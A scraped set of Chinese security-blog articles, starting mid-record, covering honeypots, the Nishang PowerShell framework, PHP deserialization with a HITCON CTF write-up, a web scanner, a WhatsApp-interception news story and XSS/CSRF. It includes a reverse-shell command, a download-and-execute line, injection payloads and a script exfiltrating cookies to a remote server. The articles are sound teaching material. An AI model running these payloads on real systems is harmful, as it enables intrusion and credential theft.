且在敌人毫不知情的情况下，记录他们入侵蜜罐系统的全部操作。所以说，蜜罐的价值在于诱骗攻击。蜜罐涉及的法律问题：蜜罐是用来给黑客入侵的，它必须提供一定的漏洞，但是我们也知道，很多漏洞都属于“高危”级别，稍有不慎就会导致系统被渗透，一旦蜜罐被破坏，入侵者要做的事情是管理员无法预料的，例如，一个入侵者成功进入了一台蜜罐，并且用它做“跳板”(指入侵者远程控制一台或多台被入侵的计算机对别的计算机进行入侵行为)去攻击别人，那么这个损失由谁来负责?但为什么说这么好的技术会存在这不当的使用呢？打个比方，就好比在一个放有黄金的建筑物旁边再建造一个狗窝来迷惑攻击者，以此用狗窝来转移攻击者的注意力，让他们觉得“hi，你要的黄金可能在这里面”，你觉得的这样能起到迷惑的效果吗？所以说，简单地安装和配置蜜罐不足以有效地打击网络犯罪，企业需要一种更细致的方法来开发一种用于检测APT攻击的方案，至少，有必要对攻击者的潜在攻击行为进行专家评估，然后再设置蜜罐，使得攻击者不能确定哪些资源（工作站，工作站和服务器上的文件等）是陷阱，哪些资源不是陷阱，这就好比在放黄金的建筑物旁再多造一些一模一样的房子才能起到迷惑效果。只有正确设置了陷阱并对与发生的攻击进行快速响应才能起到防范的效果。在企业网络的安全防护中只有提前获取有关网络攻击的信息才能使防御方可以采取有效的措施保护其有价值的数据并消除威胁：1.以错误的信息反馈给攻击者（例如，利用专用子网），从而从其视野中隐藏有价值的资源，以及获得关于攻击者及其工具的附加信息，进而用于进一步调查。2.识别受损的资源并采取一切必要措施消除威胁（例如，将受感染的工作站与公司网络上的其余资源隔离）。3.牵制攻击者的攻击行为，拖延攻击时间并且重新定义入口点，使得攻击可以被消除。结论不过明枪易躲暗箭难防，攻击者还是比防御者更有优势，因为他们有能力在进行攻击之前彻底检查他们的攻击对象，而攻击者却不知道攻击来自哪里或攻击者对什么内容感兴趣，因此必须对所有可能的攻击情形进行防护，这就需要大量的时间和耗费大量的资源。而实施这种有点欺骗的方法，使得防御方能够通过资源陷阱获得关于攻击的信息，从而最小化了攻击者所享有的优势，因为防御方早期就能够检测到攻击者的活动并获得关于他们的攻击信息，使得防御方能够及时采取措施来保护有价值的数据。未来，随着企业和公共部门的安全事件数量的增加，基于欺骗攻击者的互动安全措施会越来越受到欢迎，可以肯定基于欺骗方法的安全系统将不仅仅是研究人员的工具，而且还将成为企业保护基础设施的一个重要组成部分。企业从防御资源限制等情况考虑，追求绝对安全的防御显然是不现实的。基于“适度安全”的理念，这种交互式防护策略可以理解为在网络安全风险和投入之间寻求一种均衡，利用有限的资源做出最合理决策的防御。网络安全的本质在于攻防两端能力较量，目前依赖防火墙、入侵检测技术和反病毒软件等静态的、孤立的、被动式防御难以有效应对有组织的高强度网络攻击。构筑网络空间安全防线，需要革除落伍思想，打赢防御理念上的反击战。新“三十六计”之移动目标防御通过构建动态网络增加攻击难度从而达到入侵控制目的。","2017-01-30 12:40:57","网络安全","攻防计中计：教你如何隐藏，躲避APT攻击的新思维","http://nsoad.com/Article/Network-security/20170130/1041.html"
"5ccbfa764f2f0a0a7a69c070","前言Nishang是一个PowerShell攻击框架，它是PowerShell攻击脚本和有效载荷的一个集合。Nishang被广泛应用于渗透测试的各个阶段，本文主要介绍如何使用Nishang的各种姿势获","Kong","前言Nishang是一个PowerShell攻击框架，它是PowerShell攻击脚本和有效载荷的一个集合。Nishang被广泛应用于渗透测试的各个阶段，本文主要介绍如何使用Nishang的各种姿势获取一个shell。 正向连接and反向连接新手肯定都有这个疑问，什么时候用正向连接，什么时候用反向连接呢？其实很简单：目标在外网而你在内网的时候，用正向连接。目标在内网而你在外网的时候，用反向连接。都在外网的时候，两种方式皆可。Powershell交互式Shell一、基于TCP协议的Powershell交互式ShellInvoke-PowerShellTcp是PowerShell交互式正向连接或反向连接shell，基于TCP协议。参数介绍：-IPAddress &lt;String&gt; 选择-Reverse选项时是需要连接到的IP地址-Port &lt;Int32&gt; 选择-Reverse选项时是需要连接到的端口，选择-Bind选项时是需要监听的端口。-Reverse [&lt;SwitchParameter&gt;] 反向连接-Bind [&lt;SwitchParameter&gt;] 正向连接使用实例：1. 正向连接第一步：在目标机运行脚本，监听端口86第二步：使用nc连接到目标机端口862. 反向连接第一步：使用nc监听本地端口86（注意必须先监听，不然在目标机上执行脚本会出错）root@kali:~# nc -ltp 86第二步：在目标机上反弹shellInvoke-PowerShellTcp -Reverse -IPAddress 192.168.110.128 -Port 86第三步：观察攻击机，可以发现成功反弹shell二、基于UDP协议的PowerShell交互式ShellInvoke-PowerShellUdpPowershell交互式正向连接或反向连接shell，基于UDP协议。使用实例：1. 正向连接正向连接，和上面用法相同，不过是基于UDP协议，所以nc命令就要改动一下了。2. 反向连接反向连接，和上面用法相同，不过在使用nc监听的时候使用UDP协议。三、基于HTTP和HTTPS协议的PowerShell交互式ShellInvoke-PoshRatHttp and Invoke-PoshRatHttps是Powershell交互式反向连接shell，基于HTTP协议和HTTPS协议。用法实例：（由于两种脚本用法相同，这里以基于HTTP协议的脚本为例子）第一步：首先我们需要在攻击机上使用脚本，需要的信息有攻击机IP，要监听的端口。运行完脚本，就等着目标机反弹Shell了。第二步：在目标机上运行下列命令，反弹Shell扫描进行时Nishang基本上包含了渗透测试各个阶段的脚本，在扫描阶段，它也有两个很实用的脚本暴力破解和端口扫描。一、暴力破解-Invoke-BruteForceInvoke-BruteForce是Nishang中一个专注于暴力破解的脚本，它可以破解SQL Server、ActiveDirecotry、FTP、Web等服务。使用实例：Invoke-BruteForce -ComputerName SQLServ01 -UserList C:\test\username.txt -PasswordList C:\test\password.txt -Service SQL -Verbose二、端口扫描-Invoke-PortScanInvoke-PortScan是Nishang中一个端口扫描脚本，它可以发现主机、解析主机名、端口扫描，是实战中一个很实用的脚本。参数介绍：-StartAddress &lt;String&gt;起始IP-EndAddress &lt;String&gt;终止IP-ResolveHost 加上这个参数，解析主机名。-ScanPort 加上这个参数，扫描端口-Ports 指定扫描的端口实用实例：发现存活主机，解析主机名、扫描80端口是否开放。Invoke -StartAddress 192.168.110.1 -EndAddress 192.168.110.130 -ResolveHost -ScanPort -Ports 80常用Execution一、Download_ExecuteDownload_Execute是Nishang中一个下载执行脚本，它在实战中最常用的功能就是下载一个文本文件，然后将其转换为可执行文件执行。使用实例：第一步：首先我们需要使用Nishang中的exetotext.ps1脚本将可执行文件更改为文本文件。PS C:\Users\root&gt; ExetoText c:\powershell\msf.exe c:\powershell\msf.txtConverted file written to c:\powershell\msf.txt第二步：使用Download_Execute下载执行文本文件PS C:\Users\root&gt; Download_Execute http://192.168.110.128/msf.txt第三步：观察Metasploit。可以发现成功获得Shell客户端Nishang中还有生成各种危害文件的脚本，它们可以生成各种感染的文件，如HTA、Word，来执行powershell脚本。可以神不知鬼不觉的发动攻击，由于各个脚本用法相同，这里以生成受感染的HTA为例子。Out-HTA功能：创建受感染的HTA文件，可以执行PowerShell命令和脚本。用法实例：第一步：我们先来创建受感染的HTA文件。在下图中我们可以发现成功生成了一个受感染的HTA文件hello.hta第二步：先使用nc来监听端口，然后运行受感染的HTA文件，可以发现成功反弹Shell其他Nishang中还有很多经典实用的渗透脚本，不可能一一为大家讲解，这里挑选几种常用的为大家来介绍一下。项目地址：https://github.com/samratashok/nishang信息收集1. Check-VM 这是Nishang中检测目标机是否为虚拟机的脚本。http://p4.qhimg.com/t0158f3e7030655976d.png2. Copy-VSS 使用卷影拷贝服务来复制SAM文件。3. Get-Information 从目标机上获取有价值信息的脚本4. Get-PassHashes 从目标机上获取Hash密码的脚本。5. Get-WLAN-Keys 从目标机上获取纯文本的WLAN密钥。6. Keylogger 键盘记录脚本，大家应该都熟悉。7. Invoke-Mimikatz 在内存中加载Mimikatz，Mimikatz大家都熟悉吧，不作介绍了。后门1. HTTP-Backdoor 可以接收来自第三方网站的指令，并在内存中执行PowerShell脚本。2. DNS_TXT_Pwnage 可以在DNS TXT查询中接收指令和PowerShell脚本，并在目标机上执行。3. Execute-OnTime 可以在目标机上指定时间执行PowerShell脚本。4. Gupt-Backdoor 可以从WLAN SSID中接收命令和脚本，而不用去连接它。总结Nishang的脚本还有很多没有介绍到，它覆盖了后门、信息收集、反弹shell、下载执行等多种脚本，需要大家慢慢学习在实战中运用学习吧，国内关于这方面的文章还是很少，仅作技术分享，谢谢。","2016-11-11 16:48:42","安全工具","渗透神器Nishang","http://nsoad.com/Security-tools/20161111/tools-748.html"
"5ccbfa764f2f0a0a7a69c071","反序列化漏洞在各种语言中都较为常见，下面介绍一下php的反序列化漏洞。1.unserialize函数php官方文档（http://php.net/manual/en/function.unserialize.php），从中可以得","silence","反序列化漏洞在各种语言中都较为常见，下面介绍一下php的反序列化漏洞。1.unserialize函数php官方文档（http://php.net/manual/en/function.unserialize.php），从中可以得到信息unserialize函数会产生一个php值，类型可能为数组、对象等等。如果被反序列化的变量为对象，在成功重构对象后php会自动调用__wakeup成员方法(如果方法存在、解构失败会返回false）同时给出了警告，不要传递给unserialize不信任的用户输入。理解序列化的字符串（unserlialize的参数）：O:3:”foo”:2:{s:4:”file”;s:9:”shell.php”;s:4:”data”;s:5:”aaaaa”;}O:3: 参数类型为对象(object),数组(array)为a“foo”:2: 参数名为foo，有两个值S:4:”file”;s:9:”shell.php”; s:参数类型为字符串(数字为i)，长度为4，值为file。长度为9的字符串shell.phps:4:”data”;s:5:”aaaaa”;} 长度为4的字符串data，长度为5的字符串aaaaaobject foo，属性file：shell.php，属性data：aaaaa2.反序列化漏洞php反序列化漏洞又称对象注入，可能会导致远程代码执行(RCE)个人理解漏洞为执行unserialize函数，调用某一类并执行魔术方法(magic method)，之后可以执行类中函数，产生安全问题。所以漏洞的前提：1）unserialize函数的变量可控2）php文件中存在可利用的类，类中有魔术方法利用场景在ctf、代码审计中常见，黑盒测试要通过检查cookie等有没有序列化的值来查看。反序列化漏洞比如去年12月的joomla反序列化漏洞、SugarCRM v6.5.23 PHP反序列化对象注入漏洞，ctf中比如三个白帽第三期、安恒杯web3。防御方法主要有对参数进行处理、换用更安全的函数。推荐阅读：SugarCRM v6.5.23 PHP反序列化对象注入漏洞分析3.反序列化练习如下为一个php文件源码，我们定义了一个对象之后又创建了对象并输出了序列化的字符串// 某类 class User {   // 类数据   public $age = 0;   public $name = '';   // 输出数据   public function PrintData()   {     echo 'User ' . $this-&gt;name . ' is ' . $this-&gt;age       . ' years old.';   } } // 创建一个对象 $usr = new User(); // 设置数据  $usr-&gt;age = 20; $usr-&gt;name = 'John';  // 输出数据  $usr-&gt;PrintData();  // 输出序列化之后的数据  echo serialize($usr); ?&gt;输出为：User John is 20 years old.O:4:""User"":2:{s:3:""age"";i:20;s:4:""name"";s:4:""John”;}以下代码同上，不过并没有创建对象，而是使用unserialize函数调用了这个类。大家可以试一下。// 某类 class User { // Class data    public $age = 0;   public $name = '';    // Print data  public function PrintData()   {     echo 'User ' . $this-&gt;name . ' is ' . $this-&gt;age . ' years old. ';   } } // 重建对象 $usr = unserialize('O:4:""User"":2:{s:3:""age"";i:20;s:4:""name"";s:4:""John"";}');  // 调用PrintData 输出数据  $usr-&gt;PrintData();  ?&gt;输出为：User John is 20 years old这个函数中的序列化字符串为’O:4:”User”:2:{s:3:”age”;i:20;s:4:”name”;s:4:”John”;}’，即一个user对象，属性值age为20，属性值name为john。调用user类并给属性赋了值，在有魔术方法时会自动调用。4.writeup实战以本次HITCON 2016的web题babytrick为例：访问链接 http://52.198.42.246/ 可以看到源代码如下：（目前已关闭，可访问https://github.com/orangetw/My-CTF-Web-Challenges/tree/master/hitcon-ctf-2016/babytrick查看源码<!--?phpinclude ""config.php"";class HITCON{  private $method;  private $args;  private $conn;  public function __construct($method, $args) {    $this--->method = $method;    $this-&gt;args = $args;    $this-&gt;__conn();  }  function show() {    list($username) = func_get_args();    $sql = sprintf(""SELECT * FROM users WHERE username='%s'"", $username);    $obj = $this-&gt;__query($sql);    if ( $obj != false ) {      $this-&gt;__die( sprintf(""%s is %s"", $obj-&gt;username, $obj-&gt;role) );    } else {      $this-&gt;__die(""Nobody Nobody But You!"");    }    }  function login() {    global $FLAG;    list($username, $password) = func_get_args();    $username = strtolower(trim(mysql_escape_string($username)));    $password = strtolower(trim(mysql_escape_string($password)));    $sql = sprintf(""SELECT * FROM users WHERE username='%s' AND password='%s'"", $username, $password);    if ( $username == 'orange' || stripos($sql, 'orange') != false ) {      $this-&gt;__die(""Orange is so shy. He do not want to see you."");    }    $obj = $this-&gt;__query($sql);    if ( $obj != false &amp;&amp; $obj-&gt;role == 'admin' ) {      $this-&gt;__die(""Hi, Orange! Here is your flag: "" . $FLAG);    } else {      $this-&gt;__die(""Admin only!"");    }  }  function source() {    highlight_file(__FILE__);  }  function __conn() {    global $db_host, $db_name, $db_user, $db_pass, $DEBUG;    if (!$this-&gt;conn)      $this-&gt;conn = mysql_connect($db_host, $db_user, $db_pass);    mysql_select_db($db_name, $this-&gt;conn);    if ($DEBUG) {      $sql = ""CREATE TABLE IF NOT EXISTS users (            username VARCHAR(64),            password VARCHAR(64),            role VARCHAR(64)          ) CHARACTER SET utf8"";      $this-&gt;__query($sql, $back=false);      $sql = ""INSERT INTO users VALUES ('orange', '$db_pass', 'admin'), ('phddaa', 'ddaa', 'user')"";      $this-&gt;__query($sql, $back=false);    }    mysql_query(""SET names utf8"");    mysql_query(""SET sql_mode = 'strict_all_tables'"");  }  function __query($sql, $back=true) {    $result = @mysql_query($sql);    if ($back) {      return @mysql_fetch_object($result);    }  }  function __die($msg) {    $this-&gt;__close();    header(""Content-Type: application/json"");    die( json_encode( array(""msg""=&gt; $msg) ) );  }  function __close() {    mysql_close($this-&gt;conn);  }  function __destruct() {    $this-&gt;__conn();    if (in_array($this-&gt;method, array(""show"", ""login"", ""source""))) {      @call_user_func_array(array($this, $this-&gt;method), $this-&gt;args);    } else {      $this-&gt;__die(""What do you do?"");    }    $this-&gt;__close();  }  function __wakeup() {    foreach($this-&gt;args as $k =&gt; $v) {      $this-&gt;args[$k] = strtolower(trim(mysql_escape_string($v)));    }  }}if(isset($_GET[""data""])) {  @unserialize($_GET[""data""]);  } else {  new HITCON(""source"", array());}从源码中可以看到使用了unserialize函数并且没有过滤，且定义了类。所以想到php反序列化漏洞、对象注入。要想得到flag，需要利用反序列化执行类中函数login。首先需要用户orange密码(如果存在orange的话)，于是利用类中show函数得到密码。看show函数我们可以看出未对参数进行过滤，可以进行sql注入，构造语句为：bla’ union select password,username,password from users where username=’orange’– –那么如何使用反序列化执行函数呢？注意到类中有魔术方法__wakeup，其中函数会对我们的输入进行过滤、转义。如何绕过__wakeup呢？谷歌发现了CVE-2016-7124，一个月前爆出的。简单来说就是当序列化字符串中，如果表示对象属性个数的值大于真实的属性个数时就会跳过__wakeup的执行。参考https://bugs.php.net/bug.php?id=72663，某一种情况下，出错的对象不会被毁掉，会绕过__wakeup函数、引用其他的魔术方法。官方exp如下：<!--?phpclass obj implements Serializable {  var $data;  function serialize() {    return serialize($this--->data);  }  function unserialize($data) {    $this-&gt;data = unserialize($data);  }}$inner = 'a:1:{i:0;O:9:""Exception"":2:{s:7:""'."""".'*'."""".'file"";R:4;}';$exploit = 'a:2:{i:0;C:3:""obj"":'.strlen($inner).':{'.$inner.'}i:1;R:4;}';$data = unserialize($exploit);echo $data[1];?&gt;根据poc进行改造如下，计入了O:9:""Exception"":2:{s:7:""*file"";R:4;};}O:6:""HITCON"":3:{s:14:""%00HITCON%00method"";s:5:""login"";s:12:""%00HITCON%00args"";a:2:{i:0;s:6:""orange"";i:1;s:8:""password"";}s:12:""%00HITCON%00conn"";O:9:""Exception"":2:{s:7:""*file"";R:4;};}}这种情况下就不会执行__wakeup方法。（同时该cve介绍了另一种情况，即成员属性数目大于实际数目时可绕过wakeup方法，把 O:6:”HITCON”:3 中的3改为任意比3大数字即可，如5。另一种绕过方法为对wakeup过滤的绕过，利用了sql注入中的/**/为什么构造的字符串为“%00HITCON%00…”呢？k14us大佬告诉我序列化时生成的序列化字符串中类名前后本来就会有0×00，url编码下为%00。可以echo(serialize($o))查看。前面举的例子之所以没用%00是因为成员属性为private。如果在文件里直接调试就不用url编码，直接” HITCON …”即可(%00替换为空格加入注入语句为：O:6:""HITCON"":3:{s:14:""%00HITCON%00method"";s:4:""show"";s:12:""%00HITCON%00args"";a:2:{i:0;s:83:""bla’ union select password,username,password from users where username=’orange’– –"";i:1;s:6:""phddaa"";}s:12:""%00HITCON%00conn"";O:9:""Exception"":2:{s:7:""*file"";R:4;};}}得到结果：{“msg”:”babytrick1234 is babytrick1234″}构造好：O:6:""HITCON"":3:{s:14:""%00HITCON%00method"";s:5:""login"";s:12:""%00HITCON%00args"";a:2:{i:0;s:6:""orange"";i:1;s:13:""babytrick1234"";}s:12:""%00HITCON%00conn"";O:9:""Exception"":2:{s:7:""*file"";R:4;};}}这时会返回{“msg”:”Orange is so shy. He do not want to see you.”}接下来考虑如何绕过，注意到__conn方法中有 mysql_query(“SET names utf8″); 观察到php的字符编码不是utf8，考虑利用字符差异绕过。目前看到的两个wp利用的字母有Ą、Ã，可实现绕过。poc为：O:6:""HITCON"":3:{s:14:""%00HITCON%00method"";s:5:""login"";s:12:""%00HITCON%00args"";a:2:{i:0;s:6:""orÃnge"";i:1;s:13:""babytrick1234"";}s:12:""%00HITCON%00conn"";O:9:""Exception"":2:{s:7:""*file"";R:4;};}}得到了空白页面，注意到 s:6:”orÃnge” ，改为s:6:”orÃnge” ，构造如下：O:6:""HITCON"":3:{s:14:""%00HITCON%00method"";s:5:""login"";s:12:""%00HITCON%00args"";a:2:{i:0;s:7:""orÃnge"";i:1;s:13:""babytrick1234"";}s:12:""%00HITCON%00conn"";O:9:""Exception"":2:{s:7:""*file"";R:4;};}}得到了结果，很开心有木有？{“msg”:”Hi, Orange! Here is your flag: hitcon{php 4nd mysq1 are s0 mag1c, isn’t it?}”}参考资料：http://0xecute.com/index.php/2016/10/10/baby-trick/#comment-644http://www.wtoutiao.com/p/1e1gMC1.htmlhttp://www.freebuf.com/vuls/80293.htmlhttp://netsecurity.51cto.com/art/201502/464982.htmhttps://kovige.github.io/2016/08/17/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/http://www.melodia.pw/2016/10/10/hitcon-2016-web-writeup/http://www.neatstudio.com/show-161-1.shtml","2016-10-20 01:56:05","Web安全","由HITCON 2016一道web聊一聊php反序列化漏洞","http://nsoad.com/Article/web/20161020/607.html"
"5ccbfa764f2f0a0a7a69c072","POST loads sent","Kong","PunkSPIDER是一款由PunkSCAN出品的大型WEB漏洞扫描器，我们利用它已经建立了一个稳定的扫描体系，每日可以实现无人值守式的运行。此外，其中运行了一个Apache Hadoop集群，每天能处理的扫描任务数以万计。PunkSPIDER的特性该扫描服务会在网上随机爬行，寻找可能存在漏洞的WEB应用，发起一些诸如SQL盲注、传统SQL注入，以及XSS等攻击。游客可以通过PunkSPIDER搜索一个URL或者一个关键词，得到相关网站的结果。同时，它采用了如Apache Hadoop等大数据级别的高端技术，但幸运的是这些都是开源的。PunkSPIDER项目的设计思想是，站长可以通过搜索自己的网站来验证其是否做好了基本的安全措施，这个结果可能会激励用户优化自身的安全措施。当然，如果是那些不怀好意的人使用了PunkSPIDER，可能会让无辜的网站受到的威胁更大。这时候，站长可以选择通过修改robots.txt，或者优化防火墙和路由的IP规则，退出该扫描器的监控。Youtube视频：https://www.youtube.com/watch?v=BEYqnOgIsSQPunkSPIDER的优势市面上的工具有不少都能够执行有限数量的扫描，但却不是很稳定，甚至会陷入崩溃和无限循环。而PunkSPIDER建立了一个非常稳定且可扩展的扫描框架体系，每天能够无人值守地自动运行，几乎能够将扫描任务无限地运行下去。PunkSPIDER还有不少潜在特质，其中一个就是帮助需要安全检测的组织梳理自身的公开资产。毕竟，并不是每个组织都能让安全团队给自己定期进行常规检测的。使用了PunkSPIDER之后，组织只需要在搜索框简单地输入URL，就能知道自己是否有重要的漏洞需要修复。此外，我们认为公众也应该去了解使用它。毕竟黑客可以访问的信息，公众自己更应该了解。同时，公众通过它还可以知道，是否自己信用卡信息和其他敏感数据已经处于不安全的境地。这里给出PunkSPIDER项目的下载地址，猛戳这里。","2016-10-28 15:29:36","安全工具","PunkSPIDER：开源大型自动化扫描系统","http://nsoad.com/Security-tools/20161028/tools-654.html"
"5ccbfa764f2f0a0a7a69c073","WhatsApp在很多人眼里面都是非常安全的一款社交软件。WhatsApp采用点对点加密，这种加密方式可以杜绝中间人攻击。就在今年八月份，WhatsApp还增加了自己的加密协议，以此来预防黑客攻击。看似攻不可破的Wh","silence","WhatsApp在很多人眼里面都是非常安全的一款社交软件。WhatsApp采用点对点加密，这种加密方式可以杜绝中间人攻击。就在今年八月份，WhatsApp还增加了自己的加密协议，以此来预防黑客攻击。看似攻不可破的WhatsApp在很多国家也引起了相关诉讼。巴西政府前不久就逮捕了WhatsApp在巴西的相关负责人，原因是因为WhatsApp不与巴西政府共享用户数据 。然而来自福布斯杂志的消息，最近WhatsApp的安全性却被以色列的一家监控公司狠狠地“打脸”。Wintego公司最近开发出一款新设备，根据其宣传手册所描述，这个设备可以监听附近WhatsApp的全部交流数据，并且对其进行解密。“前所未有的能力”Wintego开发的、用于破解WhatApp加密通讯的是个叫CatchApp的东西——据说它具备“前所未有的能力”，能从目标WhatsApp账户上获取到“所有信息”，而且还支持绝大部分版本的WhatsApp应用。文档中有提到，CatchApp的具体功能是通过一台WINT设备实现的——WINT设备可以塞进背包中；WINT“数据提取解决方案”能够获取到“目标电子邮件账户、聊天会话、社交网络资料、详细的联系人列表，文件，照片，web浏览活动等全部内容”。据说WINT的Cyber Data Extractor网络数据提取器能够搞定“很多web账户与应用的加密和安全方案”，获取其身份凭证信息。针对像WhatsApp（可能还有Facebook Messenger、Google Allo等）这样的聊天应用，提取器能够“从应用中偷窃安全数据”。Wintego宣称，WINT首先通过WiFi中间人攻击来访问到设备——不管是开放的WiFi网络，还是私密网络；采用4个独立的Wi-Fi AP来追踪多个目标，另外因为还高增益天线，所以操作起来在一定距离内都会比较稳定。相对比较早期的Wintego文档可以追溯到2013年，而下面这些则据说是这家公司市场部门近期才做出来的，对其服务有相对详细的阐述。福布斯杂志在报道中提到，他们的消息源是在今年的某次警务活动中看到这个产品小册子的，但图片中的这本手册具体来源未知。似乎有点儿不靠谱安全专家则认为，这事儿其实很不靠谱，Wintego的这个设备应该没法达到其宣传的效果——这家公司的技术不大可能破解WhatsApp。安全专家Jonathan Zdziarski就说：“我猜测他们应该是利用了一些SSL实施中的漏洞。”实际上早在2014年，WhatsApp就开始用Singal协议了，并不涉及SSL——其他不少聊天应用倒是还在用SSL。Johns Hopkins信息安全研究院的副教授和密码学专家Matthew Green认为，CatchApp有可能是个恶意程序，将WiFi连接作为攻击方式，但即便如此要搞定当前WhatsApp的协议也是不大可能的。Green对于Signal代码似乎非常赞赏：“就算用Wi-Fi AP，要搞定端到端Signal加密也不大可能。”目前WhatsApp和Signal幕后的加密专家门并不想就此事代表任何评论，因为有关这款工具的细节信息都并未披露。这本手册本身在内容方面也不怎么靠谱。比如其中有提到WhatsApp的用户数目大约是80万——从消息源来看，这本手册至少是在2015年4月之后出现的，我们知道2016年2月份，WhatsApp公布的用户数量是10亿，这两个数字相差得也是相当悬殊。Wintego到底是家什么样的公司？Wintego公司的脸面应该是Yuval Luria。此人最近才在布拉格巨型的ISS World Traning大会上做过演讲，题为《A Hybrid Tactical-Strategic Approach for Extracting Cyber Intelligence》。而这家公司的负责人应该是Nhevo Kaufman——最早于2011年建立的公司网站。不过这两位都没有在LinkedIn中表明他们与Wintego公司的关系。Luria甚至没有在自己的资料中提到任何公司；而Kaufman则在资料中写了自己是NK Business Ventures（NK-BV）的CEO，而这家公司本身就没有网站，公开的信息也非常少。Nhevo Kaufman和Yuval Luria福布斯杂志在文章中谈到，NK-BV极有可能是Wintego的母公司，也是Wintego以及许多行业情报组织的销售主力。福布斯还与Kaufman进行了简单的对谈，Kaufman当然拒绝透露有关CatchApp的信息。“鉴于使用这款产品的用户的关系，任何有关这款产品细节信息的透露都与产品本身的敏感性相悖。”“我不想给出任何细节信息，这会对使用这款产品的用户造成伤害…..将产品细节信息放到文章里面并不是什么好事。”实际上Kaufman的原话还包括这一句：“Naturally they’re customers that are governmental customers.”WikiLeaks倒是有泄露文件（来自Hacking Team）提到过NK-BV这家公司：早在2012年10月份时，Luria层透露这家公司“代表（represent）”台湾，但他并没有说具体的名字。这份泄露文件中Hacking Team的新加坡代表Daniel Maglietta提到：“从他的话来看，这次机会相当不错，如果我们要在10月31日拜访这名客户，那么我们需要尽快给他发交易协议。”这里的Hacking Team想必就不用多提其背景了。福布斯杂志在这篇文章中还提到，Wintego是高度机密情报行业的成员，也是以色列间谍精英的成员。其实在这个行业内，就WiFi攻击部分，Wintego就有不少非常低调的竞争对手（比如Rayzone）。如先前那家只需要电话号码就能监听任意设备的Ability Inc.公司，就将Wintego列为重要竞争对手。","2016-10-08 13:27:51","Web安全","真的有可能吗？某以色列公司宣称破解了WhatsApp加密通信","http://nsoad.com/Article/web/20161008/497.html"
"5ccbfa764f2f0a0a7a69c074","这两个关键词也是老生常谈了，但是还总是容易让人忘记与搞混~。","Kender","这两个关键词也是老生常谈了，但是还总是容易让人忘记与搞混~。XSS与CSRF这两个关键词时常被拉出来一起比较（尤其是面试），我在这里也在写一篇扫盲文，也帮自己整理一下知识脉络。这篇文章会用尽量“人话”的语言解释这二个关键词，让同学们对跨域，安全有更深一层次的了解。国际惯例，先上一下维基百科：XSS：跨站脚本（Cross-site scripting，通常简称为XSS）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML以及用户端脚本语言。ICSRF:跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。维基的解释依旧高深莫测啊，我用 “人话”给大家解释一下吧。XSS： 通过客户端脚本语言（最常见如：JavaScript）在一个论坛发帖中发布一段恶意的JavaScript代码就是脚本注入，如果这个代码内容有请求外部服务器，那么就叫做XSS！CSRF：又称XSRF，冒充用户发起请求（在用户不知情的情况下）,完成一些违背用户意愿的请求（如恶意发帖，删帖，改密码，发邮件等）。很多同学会搞不明白XSS与CSRF的区别，虽然这两个关键词时常抱团出现，但他们两个是不同维度的东西（或者说他们的目的是不一样的）。 XSS更偏向于方法论，CSRF更偏向于一种形式，只要是伪造用户发起的请求，都可成为CSRF攻击。通常来说CSRF是由XSS实现的，所以CSRF时常也被称为XSRF[用XSS的方式实现伪造请求]（但实现的方式绝不止一种，还可以直接通过命令行模式（命令行敲命令来发起请求）直接伪造请求[只要通过合法验证即可]）。 XSS更偏向于代码实现（即写一段拥有跨站请求功能的JavaScript脚本注入到一条帖子里，然后有用户访问了这个帖子，这就算是中了XSS攻击了），CSRF更偏向于一个攻击结果，只要发起了冒牌请求那么就算是CSRF了。简单来说，条条大路（XSS路，命令行路）通罗马（CSRF马，XSRF马）。前面讲了那么多理论介绍，那么我们来看一看实际代码吧。【 Talk is cheap，Show me the code 】场景：我在一条帖子里面写下了如下代码，发了出去，然后陆陆续续有很多可爱（wu / zhi） 的用户访问到这个帖子，然后用户接下来的所有操作都由我这串代码掌控了（各种姿势混着玩~）如下：while(true){    alert('你关不掉我');}这个就是最原始的脚本注入了。用户进来就麻烦了，一直弹窗一直弹窗。那么XSS（跨站脚本）就是照瓢画葫了，用JavaScript写一个请求跨站的脚本就是XSS了，如下：// 用 &lt;script type=""text/javascript""&gt;&lt;/script&gt; 包起来放在评论中(function(window, document) {    // 构造泄露信息用的 URL    var cookies = document.cookie;    var xssURIBase = ""http://192.168.123.123/myxss/"";    var xssURI = xssURIBase + window.encodeURI(cookies);    // 建立隐藏 iframe 用于通讯    var hideFrame = document.createElement(""iframe"");    hideFrame.height = 0;    hideFrame.width = 0;    hideFrame.style.display = ""none"";    hideFrame.src = xssURI;    // 开工    document.body.appendChild(hideFrame);})(window, document);此段代码携带着cookie信息传输给了 http://192.168.123.123/myxss/... 这段服务器，然后服务器的代码就可以接收到了用户的隐私消息，继而继续做其他的业务处理（myxss/index.php 中写一些可怕的代码，如把用户信息存进自己的数据库）。有没感觉到背后一寒看到这里感觉到危险了吧（想想初学程序时我们的站点完全没有这个意识，活生生的是在裸奔），=既然此段脚本注入能携带着用户信息到收集服务器，那么再研究研究，他自然能发邮件？发帖？一系列业务逻辑？ ~~当然可以！。这里tips一下：上面的代码仅仅是XSS，并没有发生CSRF，因为192.168.123.123/myxss/index.php 仅仅是把用户信息存起来了而已，他并没有“伪造”用户发起一些请求，所以他只算是XSS攻击而不算是CSRF攻击，如果192.168.123.123/myxss/index.php 写的代码是 将当前用户的昵称改为“我是大笨猪”，那么就算是CSRF攻击了，因为这段代码伪造用户发出了请求（但是用户却不自知）。那么下面我介绍一下最最简单的CSRF攻击（没有用到XSS的哦）：一个论坛，经过我的多次抓包分析（着重分析请求返回头，请求返回体）了解到这个论坛的删帖操作是触发 csdnblog.com/bbs/delete_article.php?id=“X"" 那么，我只需要在论坛中发一帖，包含一链接：www.csdnblog.com/bbs/delete_article.php?id=“X"" 